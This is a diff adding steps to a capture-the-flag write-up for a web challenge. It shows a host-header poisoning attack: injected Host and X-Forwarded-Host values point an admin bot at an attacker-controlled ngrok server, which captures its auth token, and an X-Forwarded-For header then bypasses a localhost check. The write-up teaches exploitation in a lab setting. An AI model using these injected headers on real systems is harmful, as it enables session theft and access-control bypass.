@@ -104,14 +104,26 @@ So we retreive a lot of informations and they are:
 First step is to setup our HTTP server with all files & directories included
 ![ngrok_hosting](https://user-images.githubusercontent.com/45040001/187318454-c153a9c9-9530-43d9-8f93-26bab32d86cd.png)
 
+<br>
+
+Right now we are ready to start the whole attack step by step. Fist of all we need to know how many letters are saved in database to inject the last letter `/letters?id=${inserted.lastID}` to find how many letters are seved we can send just a GET requests at `/message/3` and you will get a response with the message of the letter and the counters of the letters. 
+
+So at my situation the last letter is 16 so i have to inject the 17 letter. <br>
+Inject values is:
+- GET /letters?id=17
+- HOST: 127.0.0.1 | because of this piece of code `await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);`
+- X-Forwarded-Host: your-ngrok-ip.com
+
 ![web_poisoning](https://user-images.githubusercontent.com/45040001/187318535-9fc0269b-fac7-46a6-bbf9-3f048cedcd05.png)
 
+Send the injection requests and instantly we have to submit a new letter and this letter will be injected .
 ![submit_new_letter](https://user-images.githubusercontent.com/45040001/187318584-250a390e-745c-4d8f-b3e1-7f5560ca3c8c.png)
 
 
+after a few seconds we will successfully get the admin secret(authtoken) in our burpcollaborator.
 ![auth_cookie](https://user-images.githubusercontent.com/45040001/187318627-f3192d7b-3d86-4010-8e6e-0c298ca62a65.png)
 
-
+The next step is to bypass localhost restriction and i do that with `X-Fowarded-For` HTTP Header as i show below.
 
 ![get_flag_1](https://user-images.githubusercontent.com/45040001/187318708-ded902f8-0e25-4926-897e-8b185b125da4.png)
 
@@ -121,6 +133,7 @@ First step is to setup our HTTP server with all files & directories included
 
 ![correct_payload](https://user-images.githubusercontent.com/45040001/187318812-fb0b7c39-bb01-4797-8f2d-690a260b33d3.png)
 
+grab the flag. <br>
 ![final_flag](https://user-images.githubusercontent.com/45040001/187318733-85d968a5-fe2a-43b5-b121-949d8528c19f.png)
 
 
